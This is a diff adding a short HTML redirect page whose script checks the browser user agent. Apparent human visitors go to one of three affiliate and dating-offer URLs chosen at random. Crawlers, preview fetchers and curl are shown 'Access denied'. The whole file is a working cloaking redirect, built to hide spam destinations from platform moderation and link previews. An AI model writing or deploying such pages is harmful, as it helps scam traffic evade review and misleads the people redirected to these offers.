@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script>
+    const offers = [
+      "https://snurik.top/click?o=2&a=6549&sub_id1=domen2",
+      "https://prev.affomelody.com/hjwJEw",
+      "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tiktok&j1=1&s1=212364&s2=2151270"
+    ];
+
+    function isRealUser() {
+      const ua = navigator.userAgent || "";
+      const botKeywords = /bot|crawler|spider|curl|fetch|preview/i;
+      return !botKeywords.test(ua);
+    }
+
+    if (isRealUser()) {
+      const index = Math.floor(Math.random() * offers.length);
+      window.location.href = offers[index];
+    } else {
+      document.body.innerHTML = "<h1>Access denied</h1>";
+    }
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
